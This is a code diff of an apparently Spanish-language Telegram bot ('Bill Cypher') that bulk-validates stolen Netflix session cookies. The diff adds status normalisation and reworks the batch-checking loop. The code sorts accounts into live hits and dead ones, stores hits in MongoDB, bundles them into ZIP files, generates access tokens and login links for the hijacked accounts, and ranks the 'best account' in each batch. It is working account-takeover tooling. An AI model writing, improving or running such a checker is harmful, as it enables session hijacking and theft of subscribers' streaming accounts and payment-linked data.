@@ -88,7 +88,7 @@ GROUP_URL   = "https://t.me/TuGrupo"
 
 
 # ===========================================================================
-# 3. AISLAMIENTO DE SESIONES (EVITA MEZCLA DE COOKIES ENTRE ARCHIVOS)
+# 3. AISLAMIENTO DE SESIÓN Y NORMALIZACIÓN DE ESTADOS
 # ===========================================================================
 def _clean_checker_session() -> None:
     """Limpia a fondo sesiones HTTP y cookies previas en checker.py."""
@@ -110,6 +110,30 @@ def safe_check_cookie(*args, **kwargs) -> dict:
         return check_cookie(*args, **kwargs)
     finally:
         _clean_checker_session()
+
+def normalize_status(raw_status: str, result_dict: dict = None) -> str:
+    """
+    Normaliza cualquier variante de estado para que 'dead', 'die' o 'invalid'
+    se sumen correctamente al contador de cuentas malas.
+    """
+    st = str(raw_status or "").lower().strip()
+    if st in ("hit", "live", "valid", "active", "success"):
+        return "hit"
+    if st in ("free", "sin_plan"):
+        return "free"
+    if st in ("on_hold", "hold", "espera"):
+        return "on_hold"
+    if st in ("invalid", "dead", "die", "muerta", "expired", "bad", "fail", "failed", "expirada"):
+        return "invalid"
+    
+    # Comprobación de seguridad si el diccionario incluye booleanos
+    if result_dict:
+        if result_dict.get("live") is False or result_dict.get("valid") is False:
+            return "invalid"
+        if result_dict.get("live") is True or result_dict.get("valid") is True:
+            return "hit"
+            
+    return "error"
 
 
 # ── Registro persistente de usuarios ───────────────────────────────────────
@@ -530,9 +554,10 @@ def _yes_no(val) -> str:
 
 def _plan_title(plan_name: str, status: str) -> str:
     p = (plan_name or "").lower()
-    if status == "free":
+    st = normalize_status(status)
+    if st == "free":
         return "🔓 FREE ACCOUNT (Sin Suscripción)"
-    if status == "on_hold":
+    if st == "on_hold":
         return "⏸️ CUENTA EN ESPERA (On Hold)"
     if "premium" in p:
         return "🌟 CUENTA PREMIUM 4K"
@@ -544,25 +569,26 @@ def _plan_title(plan_name: str, status: str) -> str:
         return "📱 CUENTA BÁSICA"
     if "mobile" in p:
         return "📱 CUENTA MÓVIL"
-    if status == "hit":
-        return "✅ CUENTA VÁLIDA"
-    return "❌ CUENTA INVÁLIDA"
+    if st == "hit":
+        return "✅ CUENTA VÁLIDA (LIVE)"
+    return "❌ CUENTA INVÁLIDA (DEAD)"
 
 def _status_line(status: str, plan: str) -> str:
     p_lower = (plan or "").lower()
-    if status == "hit":
+    st = normalize_status(status)
+    if st == "hit":
         if "premium" in p_lower:
-            return "🔥 <b>Status:</b> Válido — Premium 4K ✅"
+            return "🔥 <b>Status:</b> Válido (Live) — Premium 4K ✅"
         if "standard" in p_lower:
-            return "🔥 <b>Status:</b> Válido — Standard ✅"
+            return "🔥 <b>Status:</b> Válido (Live) — Standard ✅"
         if "basic" in p_lower:
-            return "🔥 <b>Status:</b> Válido — Básica ✅"
-        return "🔥 <b>Status:</b> Válido ✅"
-    if status == "free":
+            return "🔥 <b>Status:</b> Válido (Live) — Básica ✅"
+        return "🔥 <b>Status:</b> Válido (Live) ✅"
+    if st == "free":
         return "🔓 <b>Status:</b> Sin membresía activa"
-    if status == "on_hold":
+    if st == "on_hold":
         return "⏸️ <b>Status:</b> En espera (Fallo de pago)"
-    return "❌ <b>Status:</b> No válida"
+    return "❌ <b>Status:</b> Muerta (Dead / Inválida)"
 
 def _build_card_line(result: dict) -> str:
     ct = result.get("card_type") or ""
@@ -585,7 +611,7 @@ def _build_card_line(result: dict) -> str:
     return result.get("payment") or "Desconocido"
 
 def format_result_full(result: dict, index: int = 1, total: int = 1, source: str = "") -> str:
-    status  = result.get("status", "error")
+    status  = normalize_status(result.get("status"), result)
     plan    = result.get("plan_name")   or ""
     email   = result.get("email")       or "Hidden"
     name    = result.get("name")        or ""
@@ -677,7 +703,7 @@ def format_result_full(result: dict, index: int = 1, total: int = 1, source: str
     return "\n".join(lines)
 
 def format_result_basic(result: dict, index: int = 1, total: int = 1, source: str = "") -> str:
-    status   = result.get("status", "error")
+    status   = normalize_status(result.get("status"), result)
     plan     = result.get("plan_name")    or ""
     email    = result.get("email")        or "Hidden"
     name     = result.get("name")         or ""
@@ -745,13 +771,13 @@ def format_result_basic(result: dict, index: int = 1, total: int = 1, source: st
     return "\n".join(lines)
 
 def format_error_card(result: dict, index: int = 1, total: int = 1, source: str = "") -> str:
-    status  = result.get("status", "error")
+    status  = normalize_status(result.get("status"), result)
     message = result.get("message") or ""
     nf_id   = result.get("netflix_id") or ""
     counter = f"  #{index}/{total}" if total > 1 else ""
 
     if status == "invalid":
-        header = f"❌ <b>INVÁLIDA / EXPIRADA{counter}</b>"
+        header = f"❌ <b>DEAD / INVÁLIDA{counter}</b>"
         reason = message or "La cookie ha caducado o no es válida."
     else:
         header = f"⚠️ <b>ERROR{counter}</b>"
@@ -772,7 +798,7 @@ def format_error_card(result: dict, index: int = 1, total: int = 1, source: str 
 
 def format_result(result: dict, index: int = 1, total: int = 1, source: str = "", user_id: int = 0) -> str:
     try:
-        status = result.get("status", "error")
+        status = normalize_status(result.get("status"), result)
         if status in ("error", "invalid"):
             return format_error_card(result, index, total, source)
         mode = _get_mode(user_id) if user_id else "basic"
@@ -959,7 +985,7 @@ async def send_hits_zip(update: Update, hits: list[tuple[dict, str, str]]) -> No
         nf_sec  = result.get("secure_netflix_id") or ""
         nf_vid  = result.get("nfvdid")            or ""
         num_ex     = result.get("num_extra_members")  or 0
-        status     = result.get("status")            or "hit"
+        status     = normalize_status(result.get("status"), result)
         is_hold    = result.get("is_on_hold", False) or (status == "on_hold")
         free_trial = result.get("is_in_free_trial",  False)
         prof_count = result.get("profile_count")     or len(result.get("profile_names") or []) or 0
@@ -1046,7 +1072,7 @@ async def send_hits_zip(update: Update, hits: list[tuple[dict, str, str]]) -> No
 
     try:
         with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
-            on_hold_count = sum(1 for r, _, _ in deduped if r.get("status") == "on_hold")
+            on_hold_count = sum(1 for r, _, _ in deduped if normalize_status(r.get("status"), r) == "on_hold")
             W = 52
             summary_lines = [
                 "╔" + "═" * W + "╗",
@@ -1121,6 +1147,272 @@ async def send_hits_zip(update: Update, hits: list[tuple[dict, str, str]]) -> No
         caption="\n".join(caption_parts),
         parse_mode=ParseMode.HTML,
     )
+
+
+# ---------------------------------------------------------------------------
+# Procesamiento central de verificación y conteo en tiempo real
+# ---------------------------------------------------------------------------
+
+async def process_cookies(update: Update, status_msg, cookie_text: str, source: str = "") -> None:
+    sets = split_cookies_from_text(cookie_text)
+    if not sets:
+        await status_msg.edit_text("⚠️ No se encontraron cookies.")
+        return
+
+    if len(sets) == 1:
+        await status_msg.edit_text(
+            "⚡ <b>BILL CYPHER | CHECKING</b>\n"
+            "━━━━━━━━━━━━━━━━━━\n"
+            "🍪 <b>Cuenta:</b> 1 detectada\n"
+            "🔄 <b>Estado:</b> <i>Conectando a Netflix API...</i>\n"
+            "━━━━━━━━━━━━━━━━━━",
+            parse_mode=ParseMode.HTML,
+        )
+    else:
+        await status_msg.edit_text(
+            "⚡ <b>BILL CYPHER | CHECKING</b>\n"
+            "━━━━━━━━━━━━━━━━━━\n"
+            f"📦 <b>Lote detectado:</b> {len(sets)} cuentas\n"
+            "🔄 <b>Estado:</b> <i>Iniciando verificación masiva...</i>\n"
+            "━━━━━━━━━━━━━━━━━━",
+            parse_mode=ParseMode.HTML,
+        )
+
+    tuples = [(source or f"cuenta_{i}", s, s) for i, s in enumerate(sets, 1)]
+    await process_cookie_sets(update, status_msg, tuples)
+
+async def process_cookie_sets(update: Update, status_msg, cookie_sets: list[tuple[str, str, str]]) -> None:
+    loop = asyncio.get_running_loop()
+    total = len(cookie_sets)
+    is_bulk = total > 1
+
+    if total == 0:
+        await status_msg.edit_text("⚠️ No se encontraron datos.")
+        return
+
+    uid = update.effective_user.id if update.effective_user else 0
+    hits_list: list[tuple[dict, str, str]] = []
+    hits = frees = invalids = errors = on_hold = 0
+    t_start = time.monotonic()
+    session_id = status_msg.message_id
+    if uid:
+        _USER_SESSION[uid] = session_id
+    error_retry: list[tuple[str, str, str]] = []
+
+    for batch_start in range(0, total, BULK_CONCURRENCY):
+        if session_id in _CANCEL_SESSIONS:
+            _CANCEL_SESSIONS.discard(session_id)
+            await status_msg.edit_text("🛑 <b>Verificación cancelada.</b>", parse_mode=ParseMode.HTML)
+            if hits_list:
+                await send_hits_zip(update, hits_list)
+            return
+
+        batch = cookie_sets[batch_start: batch_start + BULK_CONCURRENCY]
+
+        batch_results = await asyncio.gather(*[
+            loop.run_in_executor(
+                _EXECUTOR,
+                functools.partial(safe_check_cookie, generate_token=not is_bulk, bulk_mode=is_bulk),
+                cs,
+            )
+            for _src, cs, _raw in batch
+        ], return_exceptions=True)
+
+        for (src, cs, raw), result in zip(batch, batch_results):
+            if isinstance(result, Exception):
+                result = {"status": "error", "message": str(result)}
+
+            status = normalize_status(result.get("status"), result)
+            idx = batch_start + batch.index((src, cs, raw)) + 1
+
+            if status == "hit":
+                hits += 1
+                hits_list.append((result, src, raw))
+            elif status == "free":
+                frees += 1
+            elif status == "on_hold":
+                on_hold += 1
+                hits_list.append((result, src, raw))
+            elif status == "invalid":
+                invalids += 1
+            else:
+                if is_bulk:
+                    error_retry.append((src, cs, raw))
+                else:
+                    errors += 1
+
+            user_id = update.effective_user.id if update.effective_user else 0
+            stats_tracker.record_check(status, user_id=user_id, source=src)
+            if status in ("hit", "free", "on_hold"):
+                mongodb_store.save_hit(result, user_id=user_id, source=src)
+            result["_source"] = src
+
+            if not is_bulk:
+                txt = format_result(result, idx, total, source=src, user_id=uid)
+                kb  = _login_keyboard(result)
+                if kb is None and status in ("hit", "on_hold"):
+                    _GEN_LINK_STORE[str(session_id)] = {
+                        "result": result, "idx": idx, "total": total,
+                        "src": src, "uid": uid, "ts": time.time(),
+                    }
+                    kb = InlineKeyboardMarkup([[
+                        InlineKeyboardButton("🔑 Generar enlaces de acceso", callback_data=f"genlink:{session_id}"),
+                    ]])
+                try:
+                    await update.message.reply_text(txt, parse_mode=ParseMode.HTML, reply_markup=kb)
+                except Exception:
+                    pass
+
+        # Actualiza el mensaje en tiempo real inmediatamente después de procesar cada lote
+        if is_bulk:
+            done_so_far = min(batch_start + len(batch), total)
+            elapsed = time.monotonic() - t_start
+            speed = done_so_far / elapsed * 60 if elapsed > 1 and done_so_far > 0 else 0
+            try:
+                await status_msg.edit_text(
+                    "⚡ <b>BILL CYPHER | VERIFICANDO</b>\n"
+                    "━━━━━━━━━━━━━━━━━━\n"
+                    f"📊 <b>Progreso:</b> {make_progress_bar(done_so_far, total)} {done_so_far}/{total}\n"
+                    f"🚀 <b>Velocidad:</b> {speed:.1f} acc/min\n\n"
+                    f"● <b>Hits (Live):</b> {hits}  ·  <b>Muertas (Dead):</b> {invalids}\n"
+                    f"● <b>En espera:</b> {on_hold}  ·  <b>Free:</b> {frees}\n"
+                    "━━━━━━━━━━━━━━━━━━\n"
+                    "⏳ <i>Procesando cuentas en tiempo real...</i>",
+                    parse_mode=ParseMode.HTML,
+                    reply_markup=_cancel_keyboard(session_id),
+                )
+            except Exception:
+                pass
+
+    if is_bulk and error_retry:
+        retry_results = await asyncio.gather(*[
+            loop.run_in_executor(
+                _EXECUTOR,
+                functools.partial(safe_check_cookie, generate_token=False, bulk_mode=True),
+                cs,
+            )
+            for _src, cs, _raw in error_retry
+        ], return_exceptions=True)
+
+        for (src, cs, raw), result in zip(error_retry, retry_results):
+            if isinstance(result, Exception):
+                result = {"status": "invalid", "message": "Timeout"}
+            status = normalize_status(result.get("status"), result)
+            if status == "hit":
+                hits += 1
+                hits_list.append((result, src, raw))
+            elif status == "free":
+                frees += 1
+            elif status == "on_hold":
+                on_hold += 1
+                hits_list.append((result, src, raw))
+            else:
+                invalids += 1
+            stats_tracker.record_check(status, user_id=uid, source=src)
+            result["_source"] = src
+
+    elapsed = time.monotonic() - t_start
+    speed   = total / elapsed * 60 if elapsed > 0 else 0
+    mins, secs = divmod(int(elapsed), 60)
+    time_str = f"{mins}m {secs}s" if mins else f"{secs}s"
+
+    _CANCEL_SESSIONS.discard(session_id)
+    _USER_SESSION.pop(uid, None)
+
+    if is_bulk and hits_list:
+        _seen_keys: set[str] = set()
+        _deduped: list[tuple[dict, str, str]] = []
+        for _item in hits_list:
+            _nf_id = _item[0].get("netflix_id") or ""
+            if _nf_id and _nf_id in _seen_keys:
+                continue
+            if _nf_id:
+                _seen_keys.add(_nf_id)
+            _deduped.append(_item)
+        hits_list = _deduped
+        hits    = sum(1 for r, _, _ in _deduped if normalize_status(r.get("status"), r) == "hit")
+        on_hold = sum(1 for r, _, _ in _deduped if normalize_status(r.get("status"), r) == "on_hold")
+
+    if is_bulk:
+        premium_count = sum(1 for r, _, _ in hits_list if "premium" in (r.get("plan_name") or "").lower())
+        try:
+            await status_msg.edit_text(
+                "⚡ <b>BILL CYPHER | COMPLETADO</b>\n"
+                "━━━━━━━━━━━━━━━━━━\n"
+                f"✅ <i>Verificación masiva completada con éxito</i>\n"
+                f"⏱️ <b>Tiempo:</b> {time_str}  ·  🚀 <b>Velocidad:</b> {speed:.1f} acc/min\n"
+                "━━━━━━━━━━━━━━━━━━",
+                parse_mode=ParseMode.HTML,
+                reply_markup=None,
+            )
+        except Exception:
+            pass
+
+        await update.message.reply_text(
+            f"📊 <b>Resumen Masivo — Resultados</b>\n"
+            "━━━━━━━━━━━━━━━━━━\n"
+            f"  ✅ Hits (Live / Activos) » <b>{hits}</b> (🌟 Premium: {premium_count})\n"
+            f"  ❌ Muertas (Dead / Inválidas) » <b>{invalids}</b>\n"
+            f"  ⏸️ En espera (On Hold)   » <b>{on_hold}</b>\n"
+            f"  🔓 Free (Sin plan)       » <b>{frees}</b>\n"
+            f"  ⚠️ Errores de red        » <b>{errors}</b>\n"
+            "━━━━━━━━━━━━━━━━━━\n"
+            f"  📦 Total comprobado      » <b>{total}</b>\n"
+            f"  ⏱️ Tiempo total          » <b>{time_str}</b>\n"
+            f"  🚀 Velocidad media       » <b>{speed:.1f} acc/min</b>",
+            parse_mode=ParseMode.HTML,
+        )
+
+        if hits_list:
+            delivery = _get_delivery(uid)
+            if delivery == "cards":
+                from checker import generate_nftoken as _generate_nftoken
+                async def _ensure_token(result: dict) -> None:
+                    nft = result.get("nftoken")
+                    if not nft or not nft.get("success"):
+                        nf_id = result.get("netflix_id")
+                        if nf_id:
+                            try:
+                                t = await loop.run_in_executor(_EXECUTOR, _generate_nftoken, {"NetflixId": nf_id})
+                                result["nftoken"] = t
+                            except Exception:
+                                pass
+
+                await asyncio.gather(*[_ensure_token(r) for r, _, _ in hits_list], return_exceptions=True)
+                card_total = len(hits_list)
+                for card_i, (c_result, c_src, _) in enumerate(hits_list, 1):
+                    try:
+                        c_txt = format_result(c_result, card_i, card_total, source=c_src, user_id=uid)
+                        c_kb  = _login_keyboard(c_result)
+                        await update.message.reply_text(c_txt, parse_mode=ParseMode.HTML, reply_markup=c_kb)
+                        await asyncio.sleep(0.3)
+                    except Exception:
+                        pass
+            else:
+                try:
+                    await send_hits_zip(update, hits_list)
+                except Exception as _ze:
+                    await update.message.reply_text(f"⚠️ Error al crear el ZIP: {_ze}", parse_mode=ParseMode.HTML)
+
+                try:
+                    sorted_hits = sorted(hits_list, key=lambda x: _score_account(x[0]), reverse=True)
+                    best_result, best_src, _ = sorted_hits[0]
+                    best_txt = format_result(best_result, 1, 1, source=best_src, user_id=uid)
+                    best_kb  = _login_keyboard(best_result)
+                    full_best = (
+                        "🏆 <b>Mejor Cuenta del Lote</b>\n"
+                        "━━━━━━━━━━━━━━━━━━\n" + best_txt
+                    )
+                    await update.message.reply_text(full_best, parse_mode=ParseMode.HTML, reply_markup=best_kb)
+                except Exception:
+                    pass
+        else:
+            await update.message.reply_text("📭 No se encontraron hits válidos en este lote.")
+
+    try:
+        await status_msg.delete()
+    except Exception:
+        pass
 
 
 # ---------------------------------------------------------------------------
@@ -1983,271 +2275,7 @@ async def besthits_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) 
 
 
 # ---------------------------------------------------------------------------
-# Procesamiento central de verificación
-# ---------------------------------------------------------------------------
-
-async def process_cookies(update: Update, status_msg, cookie_text: str, source: str = "") -> None:
-    sets = split_cookies_from_text(cookie_text)
-    if not sets:
-        await status_msg.edit_text("⚠️ No se encontraron cookies.")
-        return
-
-    if len(sets) == 1:
-        await status_msg.edit_text(
-            "⚡ <b>BILL CYPHER | CHECKING</b>\n"
-            "━━━━━━━━━━━━━━━━━━\n"
-            "🍪 <b>Cuenta:</b> 1 detectada\n"
-            "🔄 <b>Estado:</b> <i>Conectando a Netflix API...</i>\n"
-            "━━━━━━━━━━━━━━━━━━",
-            parse_mode=ParseMode.HTML,
-        )
-    else:
-        await status_msg.edit_text(
-            "⚡ <b>BILL CYPHER | CHECKING</b>\n"
-            "━━━━━━━━━━━━━━━━━━\n"
-            f"📦 <b>Lote detectado:</b> {len(sets)} cuentas\n"
-            "🔄 <b>Estado:</b> <i>Iniciando verificación masiva...</i>\n"
-            "━━━━━━━━━━━━━━━━━━",
-            parse_mode=ParseMode.HTML,
-        )
-
-    tuples = [(source or f"cuenta_{i}", s, s) for i, s in enumerate(sets, 1)]
-    await process_cookie_sets(update, status_msg, tuples)
-
-async def process_cookie_sets(update: Update, status_msg, cookie_sets: list[tuple[str, str, str]]) -> None:
-    loop = asyncio.get_running_loop()
-    total = len(cookie_sets)
-    is_bulk = total > 1
-
-    if total == 0:
-        await status_msg.edit_text("⚠️ No se encontraron datos.")
-        return
-
-    uid = update.effective_user.id if update.effective_user else 0
-    hits_list: list[tuple[dict, str, str]] = []
-    hits = frees = invalids = errors = on_hold = 0
-    t_start = time.monotonic()
-    session_id = status_msg.message_id
-    if uid:
-        _USER_SESSION[uid] = session_id
-    error_retry: list[tuple[str, str, str]] = []
-
-    for batch_start in range(0, total, BULK_CONCURRENCY):
-        if session_id in _CANCEL_SESSIONS:
-            _CANCEL_SESSIONS.discard(session_id)
-            await status_msg.edit_text("🛑 <b>Verificación cancelada.</b>", parse_mode=ParseMode.HTML)
-            if hits_list:
-                await send_hits_zip(update, hits_list)
-            return
-
-        batch = cookie_sets[batch_start: batch_start + BULK_CONCURRENCY]
-        if is_bulk:
-            done_so_far = batch_start
-            elapsed = time.monotonic() - t_start
-            speed = done_so_far / elapsed * 60 if elapsed > 1 and done_so_far > 0 else 0
-            try:
-                await status_msg.edit_text(
-                    "⚡ <b>BILL CYPHER | VERIFICANDO</b>\n"
-                    "━━━━━━━━━━━━━━━━━━\n"
-                    f"📊 <b>Progreso:</b> {make_progress_bar(done_so_far, total)} {done_so_far}/{total}\n"
-                    f"🚀 <b>Velocidad:</b> {speed:.1f} acc/min\n\n"
-                    f"● <b>Hits:</b> {hits}  ·  <b>Inválidas:</b> {invalids}\n"
-                    f"● <b>En espera:</b> {on_hold}  ·  <b>Free:</b> {frees}\n"
-                    "━━━━━━━━━━━━━━━━━━\n"
-                    "⏳ <i>Procesando cuentas en tiempo real...</i>",
-                    parse_mode=ParseMode.HTML,
-                    reply_markup=_cancel_keyboard(session_id),
-                )
-            except Exception:
-                pass
-
-        batch_results = await asyncio.gather(*[
-            loop.run_in_executor(
-                _EXECUTOR,
-                functools.partial(safe_check_cookie, generate_token=not is_bulk, bulk_mode=is_bulk),
-                cs,
-            )
-            for _src, cs, _raw in batch
-        ], return_exceptions=True)
-
-        for (src, cs, raw), result in zip(batch, batch_results):
-            if isinstance(result, Exception):
-                result = {"status": "error", "message": str(result)}
-
-            status = result.get("status", "error")
-            idx = batch_start + batch.index((src, cs, raw)) + 1
-
-            if status == "hit":
-                hits += 1
-                hits_list.append((result, src, raw))
-            elif status == "free":
-                frees += 1
-            elif status == "on_hold":
-                on_hold += 1
-                hits_list.append((result, src, raw))
-            elif status == "invalid":
-                invalids += 1
-            else:
-                if is_bulk:
-                    error_retry.append((src, cs, raw))
-                else:
-                    errors += 1
-
-            user_id = update.effective_user.id if update.effective_user else 0
-            stats_tracker.record_check(status, user_id=user_id, source=src)
-            if status in ("hit", "free", "on_hold"):
-                mongodb_store.save_hit(result, user_id=user_id, source=src)
-            result["_source"] = src
-
-            if not is_bulk:
-                txt = format_result(result, idx, total, source=src, user_id=uid)
-                kb  = _login_keyboard(result)
-                if kb is None and status in ("hit", "on_hold"):
-                    _GEN_LINK_STORE[str(session_id)] = {
-                        "result": result, "idx": idx, "total": total,
-                        "src": src, "uid": uid, "ts": time.time(),
-                    }
-                    kb = InlineKeyboardMarkup([[
-                        InlineKeyboardButton("🔑 Generar enlaces de acceso", callback_data=f"genlink:{session_id}"),
-                    ]])
-                try:
-                    await update.message.reply_text(txt, parse_mode=ParseMode.HTML, reply_markup=kb)
-                except Exception:
-                    pass
-
-    if is_bulk and error_retry:
-        retry_results = await asyncio.gather(*[
-            loop.run_in_executor(
-                _EXECUTOR,
-                functools.partial(safe_check_cookie, generate_token=False, bulk_mode=True),
-                cs,
-            )
-            for _src, cs, _raw in error_retry
-        ], return_exceptions=True)
-
-        for (src, cs, raw), result in zip(error_retry, retry_results):
-            if isinstance(result, Exception):
-                result = {"status": "invalid", "message": "Timeout"}
-            status = result.get("status", "invalid")
-            if status == "hit":
-                hits += 1
-                hits_list.append((result, src, raw))
-            elif status == "free":
-                frees += 1
-            elif status == "on_hold":
-                on_hold += 1
-                hits_list.append((result, src, raw))
-            else:
-                invalids += 1
-            stats_tracker.record_check(status, user_id=uid, source=src)
-            result["_source"] = src
-
-    elapsed = time.monotonic() - t_start
-    speed   = total / elapsed * 60 if elapsed > 0 else 0
-    mins, secs = divmod(int(elapsed), 60)
-    time_str = f"{mins}m {secs}s" if mins else f"{secs}s"
-
-    _CANCEL_SESSIONS.discard(session_id)
-    _USER_SESSION.pop(uid, None)
-
-    if is_bulk and hits_list:
-        _seen_keys: set[str] = set()
-        _deduped: list[tuple[dict, str, str]] = []
-        for _item in hits_list:
-            _nf_id = _item[0].get("netflix_id") or ""
-            if _nf_id and _nf_id in _seen_keys:
-                continue
-            if _nf_id:
-                _seen_keys.add(_nf_id)
-            _deduped.append(_item)
-        hits_list = _deduped
-        hits    = sum(1 for r, _, _ in _deduped if r.get("status") == "hit")
-        on_hold = sum(1 for r, _, _ in _deduped if r.get("status") == "on_hold")
-
-    if is_bulk:
-        premium_count = sum(1 for r, _, _ in hits_list if "premium" in (r.get("plan_name") or "").lower())
-        try:
-            await status_msg.edit_text(
-                "⚡ <b>BILL CYPHER | COMPLETADO</b>\n"
-                "━━━━━━━━━━━━━━━━━━\n"
-                f"✅ <i>Verificación masiva completada con éxito</i>\n"
-                f"⏱️ <b>Tiempo:</b> {time_str}  ·  🚀 <b>Velocidad:</b> {speed:.1f} acc/min\n"
-                "━━━━━━━━━━━━━━━━━━",
-                parse_mode=ParseMode.HTML,
-                reply_markup=None,
-            )
-        except Exception:
-            pass
-
-        await update.message.reply_text(
-            f"📊 <b>Resumen Masivo — Resultados</b>\n"
-            "━━━━━━━━━━━━━━━━━━\n"
-            f"  ✅ Hits (activos)     » <b>{hits}</b> (🌟 Premium: {premium_count})\n"
-            f"  ⏸️ En espera          » <b>{on_hold}</b>\n"
-            f"  🔓 Free (sin plan)    » <b>{frees}</b>\n"
-            f"  ❌ Inválidas/Expiradas» <b>{invalids}</b>\n"
-            f"  ⚠️ Errores            » <b>{errors}</b>\n"
-            "━━━━━━━━━━━━━━━━━━\n"
-            f"  📦 Total comprobado   » <b>{total}</b>\n"
-            f"  ⏱️ Tiempo total       » <b>{time_str}</b>\n"
-            f"  🚀 Velocidad media    » <b>{speed:.1f} acc/min</b>",
-            parse_mode=ParseMode.HTML,
-        )
-
-        if hits_list:
-            delivery = _get_delivery(uid)
-            if delivery == "cards":
-                from checker import generate_nftoken as _generate_nftoken
-                async def _ensure_token(result: dict) -> None:
-                    nft = result.get("nftoken")
-                    if not nft or not nft.get("success"):
-                        nf_id = result.get("netflix_id")
-                        if nf_id:
-                            try:
-                                t = await loop.run_in_executor(_EXECUTOR, _generate_nftoken, {"NetflixId": nf_id})
-                                result["nftoken"] = t
-                            except Exception:
-                                pass
-
-                await asyncio.gather(*[_ensure_token(r) for r, _, _ in hits_list], return_exceptions=True)
-                card_total = len(hits_list)
-                for card_i, (c_result, c_src, _) in enumerate(hits_list, 1):
-                    try:
-                        c_txt = format_result(c_result, card_i, card_total, source=c_src, user_id=uid)
-                        c_kb  = _login_keyboard(c_result)
-                        await update.message.reply_text(c_txt, parse_mode=ParseMode.HTML, reply_markup=c_kb)
-                        await asyncio.sleep(0.3)
-                    except Exception:
-                        pass
-            else:
-                try:
-                    await send_hits_zip(update, hits_list)
-                except Exception as _ze:
-                    await update.message.reply_text(f"⚠️ Error al crear el ZIP: {_ze}", parse_mode=ParseMode.HTML)
-
-                try:
-                    sorted_hits = sorted(hits_list, key=lambda x: _score_account(x[0]), reverse=True)
-                    best_result, best_src, _ = sorted_hits[0]
-                    best_txt = format_result(best_result, 1, 1, source=best_src, user_id=uid)
-                    best_kb  = _login_keyboard(best_result)
-                    full_best = (
-                        "🏆 <b>Mejor Cuenta del Lote</b>\n"
-                        "━━━━━━━━━━━━━━━━━━\n" + best_txt
-                    )
-                    await update.message.reply_text(full_best, parse_mode=ParseMode.HTML, reply_markup=best_kb)
-                except Exception:
-                    pass
-        else:
-            await update.message.reply_text("📭 No se encontraron hits válidos en este lote.")
-
-    try:
-        await status_msg.delete()
-    except Exception:
-        pass
-
-
-# ---------------------------------------------------------------------------
-# Manejador de errores (Silenciador de conflicto activo)
+# Manejador de errores
 # ---------------------------------------------------------------------------
 
 async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -2333,7 +2361,7 @@ def main() -> None:
         global _BOT_USERNAME
         _BOT_USERNAME = (await application.bot.get_me()).username or ""
 
-        # Comandos limpios para los usuarios
+        # Comandos para usuarios normales
         user_commands = [
             BotCommand("start",    "Panel principal"),
             BotCommand("settings", "Configurar formato y entrega"),
@@ -2347,7 +2375,7 @@ def main() -> None:
         ]
         await application.bot.set_my_commands(user_commands, scope=BotCommandScopeDefault())
 
-        # Comandos exclusivos para tu chat (ID: 5320997298)
+        # Comandos exclusivos para tu cuenta (ID: 5320997298)
         admin_commands = user_commands + [
             BotCommand("proxy",     "Gestor de proxies [Admin]"),
             BotCommand("users",     "Descargar lista de usuarios [Admin]"),
